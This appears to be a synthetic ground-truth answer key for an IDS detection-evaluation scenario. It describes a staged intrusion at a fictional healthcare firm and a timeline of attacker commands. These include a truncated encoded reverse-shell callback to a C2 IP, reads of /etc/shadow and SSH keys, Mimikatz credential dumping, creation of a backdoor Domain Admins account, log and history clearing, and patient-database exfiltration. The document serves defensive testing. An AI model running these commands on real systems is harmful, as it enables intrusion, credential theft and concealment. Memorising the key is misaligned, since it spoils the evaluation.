# Ground Truth: iteration-test-expanded-ids

**Scenario:** IDS-focused variant of the expanded EvidenceForge iteration-test scenario for fast
generate/evaluate/fix cycles. It preserves the original environment and attack narrative
while adding authored, transport-correlated IDS assertions, sensor-local filtering, and
deliberate no-alert cases for broad automated and LLM-as-a-judge quality evaluation.
Meridian Healthcare Solutions is a mid-size healthcare IT company providing EHR
integration services from a corporate HQ with an on-premises data center. The
storyline compresses an APT-style web-app intrusion, Linux and Windows lateral
movement, credential theft, domain compromise, C2, DNS tunneling, data staging,
exfiltration, email abuse, and cleanup into a 6-hour collection window while
preserving broad event-type and log-format coverage. This expanded variant adds
explicit on-prem email topology, SMTP routing, corpus-backed message bodies,
MIME artifacts, distribution groups, Bcc handling, STARTTLS visibility, ISP relay
egress, inbound/outbound/internal mail, explicit mailbox reads, rejected mail,
and deterministic background email traffic.


**Generated:** 2024-03-18 12:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **diego.ramirez** on **WS-DRAMIREZ-01**: External benefits-themed phishing message is delivered to Finance with hidden security Bcc
2. **diego.ramirez** on **WS-DRAMIREZ-01**: Finance user reads the suspicious benefits message through OWA
3. **diego.ramirez** on **WS-DRAMIREZ-01**: Diego forwards the suspicious message to the help desk and discreetly copies security
4. **root** on **WEB-EXT-01**: External attacker scans the DMZ for exposed services
5. **root** on **WEB-EXT-01**: External attacker runs Nikto web vulnerability scanning against the EHR portal
6. **root** on **LT-MRIVERA-02**: Rogue laptop obtains an address from DHCP on the corporate LAN
7. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an internal EHR release note to a clinical operations distribution group
8. **omar.haddad** on **WS-OHADDAD-01**: Analytics user reads the EHR release note through IMAPS
9. **apache** on **WEB-EXT-01**: SQL injection probes against the EHR portal produce server errors
10. **apache** on **WEB-EXT-01**: Web shell upload and reverse shell callback to direct-IP C2
11. **root** on **WEB-EXT-01**: Network and host discovery from the compromised web server
12. **priya.patel** on **WS-PPATEL-01**: A vendor document workflow sends security an AI-generated summary with prompt-injection text in an attachment
13. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an outbound interface package to a lab vendor through the clinical route and ISP relay
14. **root** on **WEB-EXT-01**: Harvest database credentials and SSH key material from the web server
15. **root** on **APP-INT-01**: Failed SSH attempt to PROXY-01 followed by successful SSH lateral movement to APP-INT-01
16. **root** on **APP-INT-01**: Dump Linux password databases from APP-INT-01
17. **marcus.chen** on **WS-MCHEN-01**: Attacker uses explicit sysadmin credentials through RunAs
18. **root** on **LT-MRIVERA-02**: Wrong-password fumble before broader credential spray
19. **root** on **WS-AJOHNSON-01**: Credential spray succeeds against help desk user followed by RDP session
20. **aisha.johnson** on **WS-AJOHNSON-01**: Compromised help desk mailbox sends an internal credential-reset lure to finance
21. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker reads the compromised help desk mailbox through IMAPS
22. **aisha.johnson** on **WS-AJOHNSON-01**: Active Directory enumeration from compromised workstation
23. **aisha.johnson** on **WS-AJOHNSON-01**: Credential dumping with Mimikatz disguised as a Windows indexing service
24. **aisha.johnson** on **DC-01**: PsExec-style lateral movement to DC-01 through SMB service creation
25. **evelyn.brooks** on **WS-EBROOKS-01**: External invoice-themed attachment is rejected by the mail gateway
26. **SYSTEM** on **DC-01**: Create backdoor account and add it to Domain Admins
27. **SYSTEM** on **DC-01**: Install service and scheduled task persistence on DC-01
28. **SYSTEM** on **DC-01**: Allowed HTTPS beacon from DC-01 to attacker infrastructure
29. **SYSTEM** on **DC-01**: Direct C2 beacon attempts from DC-01 are blocked by firewall
30. **root** on **APP-INT-01**: DNS tunneling exfiltration from APP-INT-01
31. **evelyn.brooks** on **WS-EBROOKS-01**: Executive sends an inline-authored operating note to an outside advisor with internal Bcc
32. **root** on **WEB-EXT-01**: DGA queries from compromised web server
33. **svc_mhsync** on **FILE-SRV-01**: Backdoor account authenticates to FILE-SRV-01 and stages sensitive data
34. **root** on **DB-PROD-01**: SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01
35. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker locks compromised workstation before stepping away
36. **aisha.johnson** on **WS-AJOHNSON-01**: Upload compressed archive to external staging domain over HTTPS
37. **root** on **WEB-EXT-01**: Ongoing periodic beacon from WEB-EXT-01
38. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker returns and unlocks compromised workstation
39. **root** on **WEB-EXT-01**: Clear Linux shell history on WEB-EXT-01
40. **root** on **APP-INT-01**: Clear Linux shell history on APP-INT-01
41. **SYSTEM** on **DC-01**: Encoded PowerShell download and Security log clearing on DC-01
42. **root** on **APP-INT-01**: Standalone DNS queries for attacker infrastructure
43. **SYSTEM** on **DC-01**: Delete backdoor account after exfiltration
44. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker logs off compromised help desk workstation
45. **svc_mhsync** on **FILE-SRV-01**: Backdoor account session logs off FILE-SRV-01
46. **root** on **APP-INT-01**: Root SSH session logs off APP-INT-01


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2024-03-18 12:12:05 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: notices@benefits-serviceportal.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Benefits confirmation required today' (artifacts/email/benefits-confirmation-msg.eml) |
| 2024-03-18 12:17:47 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Read | Mailbox read: diego.ramirez@meridianhcs.com via owa on finance (UID: CLbKJdw858PKliaPIr) |
| 2024-03-18 12:24:21 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: diego.ramirez@meridianhcs.com -> aisha.johnson@meridianhcs.com, marcus.chen@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Fwd: Benefits confirmation required today' (artifacts/email/finance-forward-to-it-msg.eml) |
| 2024-03-18 12:30:12 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [22], 1 denied connections + ASA threat detection alert (733100) [IDS: SID 2002911 policy={'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=0 emitted=0 filtered=0] |
| 2024-03-18 12:30:12 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [80, 443, 8080, 8443, 3306], 5 denied connections + ASA threat detection alert (733100) |
| 2024-03-18 12:31:13 UTC | root | WEB-EXT-01 | Web_Scan | Web scan (nikto) against 10.10.3.10:443 (473 requests) |
| 2024-03-18 12:44:30 UTC | root | LT-MRIVERA-02 | Dhcp_Lease | DHCP lease for LT-MRIVERA-02 (MAC: DC:A6:32:44:91:7B) |
| 2024-03-18 12:47:38 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> lina.nguyen@meridianhcs.com, omar.haddad@meridianhcs.com, priya.patel@meridianhcs.com; subject 'EHR connector release notes' (artifacts/email/ehr-release-note-msg.eml) |
| 2024-03-18 12:52:54 UTC | omar.haddad | WS-OHADDAD-01 | Email_Read | Mailbox read: omar.haddad@meridianhcs.com via imaps on clinical (UID: ColroyPKDTqUWQfwtjH) |
| 2024-03-18 13:00:04 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CicVxJeCErOPnWqgt7) |
| 2024-03-18 13:00:06 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CMxHlNoNFlJign6DRyL) |
| 2024-03-18 13:19:36 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CopMRqEZn3CikVjALy) |
| 2024-03-18 13:19:37 UTC | apache | WEB-EXT-01 | Process | Process: /bin/bash (PID: 581367) - `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L...` |
| 2024-03-18 13:19:38 UTC | apache | WEB-EXT-01 | Connection | Connection to 45.33.32.30:8443 (UID: CrqELHRVHa8Nk721fmG) |
| 2024-03-18 13:19:40 UTC | apache | WEB-EXT-01 | Raw | Web shell upload and reverse shell callback to direct-IP C2 |
| 2024-03-18 13:39:37 UTC | root | WEB-EXT-01 | Process | Process: /usr/sbin/ip (PID: 584267) - `ip addr show` |
| 2024-03-18 13:39:43 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584285) - `cat /etc/hosts` |
| 2024-03-18 13:39:51 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584482) - `cat /etc/resolv.conf` |
| 2024-03-18 13:41:06 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/find (PID: 586013) - `find /opt/ehr -name '*credential*' -maxdepth 3` |
| 2024-03-18 13:50:14 UTC | priya.patel | WS-PPATEL-01 | Email_Message | Email delivered: workspace@docflow-health.net -> priya.patel@meridianhcs.com; subject 'DocFlow summary package: vendor terms' (artifacts/email/docflow-ai-summary-msg.eml) |
| 2024-03-18 13:51:59 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 586248) - `nmap -sn 10.10.2.0/24` |
| 2024-03-18 13:53:41 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 586880) - `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24` |
| 2024-03-18 13:55:33 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> miles.avery@stonebridge-consultingllc.com, omar.haddad@meridianhcs.com; subject 'Stonebridge interface package comments' (artifacts/email/vendor-interface-package-msg.eml) |
| 2024-03-18 13:59:49 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587118) - `cat /var/www/html/config.php` |
| 2024-03-18 13:59:53 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/ls (PID: 587132) - `ls -la /root/.ssh` |
| 2024-03-18 13:59:59 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587170) - `cat /root/.ssh/id_rsa` |
| 2024-03-18 14:15:22 UTC | root | APP-INT-01 | Connection | Connection to 10.10.3.20:22 (UID: CBW2qLwsexcKLiuQs) |
| 2024-03-18 14:15:24 UTC | root | APP-INT-01 | Ssh_Session | SSH session to 10.10.2.30:22 (UID: CBfdQLnT1W0s7FMQHI) [IDS: SID 2002911 policy={'detection_filter': None, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=2 emitted=2 filtered=0] |
| 2024-03-18 14:34:59 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962139) - `cat /etc/passwd` |
| 2024-03-18 14:35:03 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962156) - `cat /etc/shadow` |
| 2024-03-18 14:49:46 UTC | marcus.chen | WS-MCHEN-01 | Explicit_Credentials | Explicit credentials: RunAs marcus.chen on DC-01 |
| 2024-03-18 14:58:42 UTC | root | LT-MRIVERA-02 | Failed_Logon | Wrong-password fumble before broader credential spray |
| 2024-03-18 14:59:52 UTC | root | WS-AJOHNSON-01 | Credential_Spray | Credential spray: 4 attempts against 3 accounts (success: aisha.johnson at attempt 4) |
| 2024-03-18 14:59:54 UTC | aisha.johnson | WS-AJOHNSON-01 | Rdp_Session | RDP session to 10.10.1.35:3389 (UID: Ce45ZtfWFCHOUGOCGt) |
| 2024-03-18 15:08:29 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Message | Email delivered: aisha.johnson@meridianhcs.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, marcus.chen@meridianhcs.com; subject 'Help desk follow-up: credential reset validation' (artifacts/email/internal-reset-lure-msg.eml) |
| 2024-03-18 15:13:40 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Read | Mailbox read: aisha.johnson@meridianhcs.com via imaps on edge (UID: Cd8VUVRlqLiiMLGVHd) |
| 2024-03-18 15:19:43 UTC | aisha.johnson | WS-AJOHNSON-01 | Logon | Network logon from 10.10.1.99 (LogonID: 0x26ffee1) |
| 2024-03-18 15:19:45 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\whoami.exe (PID: 6760) - `whoami /all` |
| 2024-03-18 15:19:46 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6772) - `net user /domain` |
| 2024-03-18 15:19:56 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6776) - `net group "Domain Admins" /domain` |
| 2024-03-18 15:19:59 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6784) - `net view /domain` |
| 2024-03-18 15:20:02 UTC | aisha.johnson | WS-AJOHNSON-01 | Dns_Query | DNS query: DC-01.meridianhcs.local (A, NOERROR) |
| 2024-03-18 15:20:07 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 10.10.2.10:389 (UID: CsOyjHl8cVt94jNZB9) |
| 2024-03-18 15:44:53 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\ms-index-service.exe (PID: 6816) - `ms-index-service.exe "privilege::debug" "sekurl...` |
| 2024-03-18 15:44:55 UTC | aisha.johnson | WS-AJOHNSON-01 | Process_Access | Credential dumping with Mimikatz disguised as a Windows indexing service |
| 2024-03-18 15:44:57 UTC | aisha.johnson | WS-AJOHNSON-01 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2024-03-18 15:59:34 UTC | aisha.johnson | DC-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0x5552e8f) |
| 2024-03-18 15:59:39 UTC | aisha.johnson | DC-01 | Service_Installed | Service installed: PSEXESVC (%SystemRoot%\PSEXESVC.exe) |
| 2024-03-18 15:59:47 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\PSEXESVC.exe (PID: 5408) - `PSEXESVC.exe -accepteula` |
| 2024-03-18 15:59:50 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 5424) - `cmd.exe /c whoami && hostname` |
| 2024-03-18 16:07:06 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email rejected: billing@medclaims-processing.net -> evelyn.brooks@meridianhcs.com; subject 'Updated claims processing invoice' (metadata-only) |
| 2024-03-18 16:15:05 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5460) - `net user svc_mhsync MhsSvc!2024 /add /domain` |
| 2024-03-18 16:15:07 UTC | SYSTEM | DC-01 | Account_Created | Account created: svc_mhsync |
| 2024-03-18 16:15:09 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5480) - `net group "Domain Admins" svc_mhsync /add /domain` |
| 2024-03-18 16:15:21 UTC | SYSTEM | DC-01 | Group_Member_Added | Added svc_mhsync to group Domain Admins |
| 2024-03-18 16:19:50 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 5504) - `sc.exe create DeviceSyncSvc binPath= C:\Windows...` |
| 2024-03-18 16:19:52 UTC | SYSTEM | DC-01 | Service_Installed | Service installed: DeviceSyncSvc (C:\Windows\System32\DeviceSyncSvc.exe) |
| 2024-03-18 16:19:54 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 5516) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2024-03-18 16:19:56 UTC | SYSTEM | DC-01 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\DeviceSync |
| 2024-03-18 16:29:30 UTC | SYSTEM | DC-01 | Beacon | Beacon to 45.33.32.30:443 (10 attempts, 1h30m) |
| 2024-03-18 16:30:42 UTC | SYSTEM | DC-01 | Beacon | Denied beacon to 45.33.32.30:443 (4 attempts, 1h30m) |
| 2024-03-18 16:44:47 UTC | root | APP-INT-01 | Dns_Tunnel | DNS tunnel via ns1.westbridge-services.cloud (hex, 331 queries, 1704 bytes exfiltrated) [IDS: SID 2029706 policy={'detection_filter': {'track': 'by_src', 'count': 10, 'seconds': 60}, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 2, 'seconds': 300}} candidates=329 emitted=6 filtered=323] |
| 2024-03-18 16:49:34 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email delivered: evelyn.brooks@meridianhcs.com -> marina.holt@northbridge-advisory.com, diego.ramirez@meridianhcs.com, priya.patel@meridianhcs.com; subject 'March operating note' (artifacts/email/executive-operating-note-msg.eml) |
| 2024-03-18 17:00:16 UTC | root | WEB-EXT-01 | Dga_Queries | DGA queries: 91 total (80 NXDOMAIN, TLD: .top, sample: ['ewnjsaqf1rasgez5.top', '6cja6syvo02mu.top', '30rgw6r7503.top']) [IDS: SID 2027865 policy={'detection_filter': {'track': 'by_src', 'count': 2, 'seconds': 120}, 'event_filter': {'type': 'both', 'track': 'by_src', 'count': 1, 'seconds': 300}} candidates=182 emitted=18 filtered=164] |
| 2024-03-18 17:01:20 UTC | svc_mhsync | FILE-SRV-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0xf885c0c) |
| 2024-03-18 17:01:21 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5812) - `net view \\FILE-SRV-01` |
| 2024-03-18 17:01:23 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 5816) - `powershell.exe -NoProfile -Command "Compress-Ar...` |
| 2024-03-18 17:14:40 UTC | root | DB-PROD-01 | Ssh_Session | SSH session to 10.10.4.10:22 (UID: CqAYuDEihWYbsfZcQ2) |
| 2024-03-18 17:14:42 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/mysqldump (PID: 158513) - `mysqldump --single-transaction ehr patients ins...` |
| 2024-03-18 17:17:24 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/gzip (PID: 159013) - `gzip -9 /tmp/rpt_0318.sql` |
| 2024-03-18 17:19:47 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Lock | Workstation Locked |
| 2024-03-18 17:20:32 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/scp (PID: 159184) - `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/....` |
| 2024-03-18 17:25:27 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 45.33.32.30:443 (UID: CAyQq6qQy9cnDb7aBl) |
| 2024-03-18 17:29:37 UTC | root | WEB-EXT-01 | Beacon | Beacon to 45.33.32.30:443 (3 attempts, count=3) |
| 2024-03-18 17:35:30 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Unlock | Workstation Unlocked |
| 2024-03-18 17:40:08 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/shred (PID: 608794) - `shred -u /root/.bash_history` |
| 2024-03-18 17:41:20 UTC | root | APP-INT-01 | Process | Process: /bin/bash (PID: 982897) - `history -c && cat /dev/null > ~/.bash_history` |
| 2024-03-18 17:41:48 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 5900) - `powershell.exe -NoProfile -EncodedCommand SQBFA...` |
| 2024-03-18 17:41:49 UTC | SYSTEM | DC-01 | Log_Cleared | Encoded PowerShell download and Security log clearing on DC-01 |
| 2024-03-18 17:41:49 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 5940) - `wevtutil cl Security` |
| 2024-03-18 17:45:11 UTC | root | APP-INT-01 | Dns_Query | DNS query: edge.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:45:12 UTC | root | APP-INT-01 | Dns_Query | DNS query: api.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:45:13 UTC | root | APP-INT-01 | Dns_Query | DNS query: metrics.westbridge-services.net (TXT, NXDOMAIN) |
| 2024-03-18 17:49:45 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5956) - `net user svc_mhsync /delete /domain` |
| 2024-03-18 17:49:53 UTC | SYSTEM | DC-01 | Account_Deleted | Account deleted: svc_mhsync |
| 2024-03-18 17:54:50 UTC | aisha.johnson | WS-AJOHNSON-01 | Logoff | Attacker logs off compromised help desk workstation |
| 2024-03-18 17:55:48 UTC | svc_mhsync | FILE-SRV-01 | Logoff | Backdoor account session logs off FILE-SRV-01 |
| 2024-03-18 17:56:56 UTC | root | APP-INT-01 | Logoff | Root SSH session logs off APP-INT-01 |


## Source Evidence Status

Canonical ground truth remains authoritative. Source rows may be `visible`, `delayed`, `dropped`, `filtered`, or `out_of_window` depending on the selected observation profile and sensor placement.

| Storyline ID | Source | Status Counts |
|--------------|--------|---------------|
| 008deec7-3d9c-44b4-9ff9-324c636279c9 | ids | delayed: 1 |
| 0262e3f4-cbf3-4879-9b89-3ada767777f2 | ids | delayed: 2 |
| 05fe0563-6edd-42b0-b2c6-204f65fa94bb | ids | delayed: 1 |
| 08bb9df0-7cc5-4b37-a135-67b3c9c3cef6 | ids | delayed: 1 |
| 0b38d4f1-cd31-4485-954f-2dc58265ba2b | ids | delayed: 1 |
| 0ccb93c5-c48f-46d0-8ccd-de10f16fce36 | ids | delayed: 1 |
| 135c92b7-a236-480d-8c5a-482bca70680c | ids | delayed: 1 |
| 14a4ec24-b186-4302-9e3b-29cbea9f5406 | ids | delayed: 1 |
| 17c86dc9-8a57-4099-a41b-e5b306c0a86b | ids | delayed: 1 |
| 1a8806e9-c2e0-4601-b403-c4ffeafa2008 | ids | visible: 2 |
| 1e3c9c11-f2f0-4387-adaf-bae630d04abc | ids | delayed: 1 |
| 1ecff7ff-265b-4fc2-88e7-b3d67662fa65 | ids | delayed: 2 |
| 1ed1cc07-fad2-4bc0-bb35-7ef2067cfa5a | ids | filtered: 1 |
| 20d50ce6-b3a5-4154-96df-76c2802f311a | ids | delayed: 1 |
| 20f7c64b-9dd5-4383-bb6d-b9aeaecc0d74 | ids | delayed: 1 |
| 2258688d-b2f8-480c-b575-1b50f18d4959 | ids | delayed: 1 |
| 22d2715b-b36a-4f56-99a2-a956da9d842a | ids | delayed: 1 |
| 26da8698-066f-4e0d-b7ef-3dbc0e64fed1 | ids | delayed: 1 |
| 275e3cff-aa6c-4e5f-ad7b-7ac6a0562384 | ids | delayed: 1 |
| 2a14285e-dd2b-4519-b14d-7ecfb19c020a | ids | delayed: 1 |
| 2dd826a7-c3b6-43d0-9095-e05bd266bc18 | ids | delayed: 1 |
| 2e60dd68-a92a-4201-9047-1100fc0bfd85 | ids | delayed: 1 |
| 2fb42983-ddd7-434b-9b61-beef3072ef3d | ids | delayed: 1 |
| 32d5d80c-5961-4983-bb63-3b82411b240b | ids | delayed: 1 |
| 32e41802-86a7-426d-b3f7-10095e5f7c29 | ids | delayed: 1 |
| 33108145-4482-4861-8d96-a1bcd343cc75 | ids | delayed: 1 |
| 34d77785-a870-4635-823e-8248a2fa7cf3 | ids | delayed: 1 |
| 363dcc79-f368-4060-a6ab-fe7f2853ab19 | ids | delayed: 2 |
| 39bc1bbe-6184-40e7-9a86-a51ba4e3d113 | ids | delayed: 1 |
| 3b4b8531-1745-4690-ab34-d16541d853fd | ids | delayed: 1 |
| 3e62c612-449a-4849-9952-860f25fef848 | ids | delayed: 1 |
| 402168d1-4d77-4f64-a6dd-4e1fed7b6076 | ids | delayed: 1 |
| 41a1e496-116e-4976-b440-f9556e477aa3 | ids | delayed: 1 |
| 48281ecc-250d-43a6-bc41-4f7141fbb616 | ids | delayed: 1 |
| 48d4090d-d07c-45ea-bd4f-87ae28631f0d | ids | delayed: 2 |
| 4a395613-a560-40e6-a30b-841fd8a434ca | ids | delayed: 1 |
| 4ec0b4e6-ed99-4c1d-b38b-049446f8a5eb | ids | delayed: 1 |
| 56b5901c-b621-445e-85eb-fe6449c04015 | ids | delayed: 2 |
| 5770a64e-dbc5-4497-b52c-898458f69f36 | ids | visible: 2 |
| 5a5bf2b3-94ed-4b31-a7b7-12914e39d694 | ids | delayed: 1 |
| 5a77291b-7f5e-4da1-85bd-93b34a849638 | ids | delayed: 1 |
| 5aa1cf71-28ad-429a-a43a-d4ecaaf357c8 | ids | delayed: 1 |
| 5c467113-0fd8-4531-a9c7-ce04e51c0653 | ids | delayed: 1 |
| 5ed72d3a-d492-4c66-a4cb-c13748293669 | ids | delayed: 1 |
| 60202e98-28f6-4b19-b340-5c8774048eb2 | ids | delayed: 1 |
| 61894f6c-23f8-4108-a5ed-e358a0ad7d02 | ids | delayed: 1 |
| 62699482-6d57-43eb-80de-fbc98f624a4e | ids | delayed: 1 |
| 62840c57-db77-4856-80f7-6312200b6b1b | ids | delayed: 1 |
| 62aea068-ee72-4f65-8e6d-858753968a70 | ids | delayed: 1 |
| 6600b73d-06e7-4238-ac9f-acfd48c85f43 | ids | delayed: 1 |
| 6a47de3f-c0af-4658-b372-fbbafe9499ca | ids | delayed: 1 |
| 6d06f544-db9d-4796-af79-55f7643f3cba | ids | delayed: 1 |
| 6effa2c6-e411-4af5-b7af-a735f77022a2 | ids | delayed: 1 |
| 712c2978-ee15-43a7-807e-80a3f43206b1 | ids | delayed: 2 |
| 740f9185-d669-4326-aace-bc76340d706b | ids | delayed: 1 |
| 752a8587-c789-4960-acb1-c904989a2edf | ids | delayed: 1 |
| 76af0f26-aaa3-46e4-85e7-e71c57696e2b | ids | delayed: 1 |
| 7b6f6eef-b913-4ab5-9117-3e5d8730b622 | ids | delayed: 1 |
| 7c0c9e44-d8b3-49be-bbcb-a8f918d8ae82 | ids | delayed: 1 |
| 7e1c033f-8ecf-4f29-8a3a-b5b4c5d27b6d | ids | delayed: 1 |
| 80ec76e5-cb2f-4fcb-b2ee-ac3ff4307459 | ids | delayed: 2 |
| 81ba48ff-0fe6-4cbe-b970-86a53545952e | ids | delayed: 2 |
| 81baf8d2-df73-4e94-a185-7ad9d7def594 | ids | delayed: 1 |
| 8306cacd-7c64-4623-941f-ce3d78c7b8f6 | ids | delayed: 2 |
| 8355dbe0-f64f-4229-ae63-f620c405f549 | ids | delayed: 1 |
| 83824fa6-431a-4f98-b792-7a27473e09c1 | ids | delayed: 1 |
| 839c4c7c-4f0d-4b44-b97b-720c1854e4bb | ids | delayed: 1 |
| 8877dfe8-e18f-4423-b351-414c826c5491 | ids | delayed: 1 |
| 89b2c558-8c32-4c95-b310-a180c222dffb | ids | delayed: 1 |
| 8aeaaf43-136a-4c1c-972a-7532f9320303 | ids | delayed: 1 |
| 8df7a1b7-8938-4093-becc-13c1c441b341 | ids | delayed: 1 |
| 8e76f267-e836-4a82-855c-cd2f645d0bd2 | ids | delayed: 1 |
| 8fc395ef-908b-445b-824a-42b56a74b824 | ids | delayed: 1 |
| 90176976-87d5-4b00-826a-e336341dbe27 | ids | delayed: 1 |
| 929b18ff-3ab0-49dd-8149-1693e5ea5c79 | ids | delayed: 2 |
| 92d43d80-25dc-42e3-9803-300ba2b27bdc | ids | visible: 1 |
| 94327530-8b85-43c4-b175-d9a7c9e72bcc | ids | delayed: 1 |
| 962933d7-b488-4cc3-b64c-21f6f4d58ebb | ids | delayed: 2 |
| 974d64b6-827f-42c6-883e-b5987a48fb9d | ids | delayed: 1 |
| 9767ea59-2f7c-4c03-8240-bf84932ef855 | ids | delayed: 1 |
| 9a74bf4e-493e-4ae6-91ae-b393f8794425 | ids | delayed: 1 |
| 9abd9280-567a-4de6-b24b-22d2af58b04f | ids | delayed: 1 |
| 9c5e76a6-76b1-41b1-baad-89cb71a7edb2 | ids | delayed: 1 |
| 9c952685-3a9f-43d3-ac88-5b7103e742d8 | ids | delayed: 1 |
| 9da223c0-14f9-4fc5-b17e-1bbe568de039 | ids | delayed: 2 |
| 9e33d7a2-f9fe-44a3-b5b4-a1c4b8cd2795 | ids | delayed: 1 |
| 9fc3a5a4-97a4-4817-9856-141b06fae5fb | ids | delayed: 1 |
| a0239b5d-15f4-40cd-b3b8-04efb32d99b3 | ids | delayed: 1 |
| a0cefc6f-4c7a-4e09-8afb-2012c2e18255 | ids | delayed: 1 |
| a510b19b-387d-4787-a213-bb360adbcd99 | ids | delayed: 1 |
| a6f9ad16-dbae-4bbd-bdd0-216a9ccf693f | ids | delayed: 1 |
| a8d128f9-df7f-4f45-852c-ee3888f0adc7 | ids | delayed: 1 |
| a942162d-42d2-4fb1-a7ca-87bd84056193 | ids | delayed: 1 |
| aae4b630-8626-40f6-a4f7-5b6f27b6ac9e | ids | delayed: 1 |
| ab8e0041-9958-40b9-b30a-443e0c788164 | ids | delayed: 2 |
| abdf461a-6618-47b8-87c7-9bd4e06de9d9 | ids | delayed: 1 |
| b3ff9693-837d-462d-bc90-deaa4ea4c66a | ids | delayed: 1 |
| b504a031-47b5-4373-a877-3def858f4cb9 | ids | delayed: 2 |
| b8b24ba0-9fdb-4fb8-a685-e2d7dc22dc27 | ids | delayed: 1 |
| b8b2f919-5b37-451d-86a5-6d4efb868524 | ids | delayed: 1 |
| bb2bcaff-6128-4972-9a9c-f53b4e752180 | ids | delayed: 2 |
| bdc1fde7-2600-4ed3-af17-d1d4f898549e | ids | delayed: 1 |
| bfdd3429-e0da-4638-b9e0-2e9062cb5402 | ids | delayed: 1 |
| c26f3e87-5687-4160-8115-51b36b5629f2 | ids | delayed: 1 |
| c4ecf67c-75dc-45ef-a0c6-e5653ead80b6 | ids | delayed: 1 |
| c8ceee0b-12b6-4074-a335-b2cfe6266682 | ids | delayed: 2 |
| c9bb0103-43e8-44ad-b19d-d32c2f276c5a | ids | delayed: 1 |
| ccfa003d-8cf1-44aa-add1-c0dfb494b47d | ids | delayed: 1 |
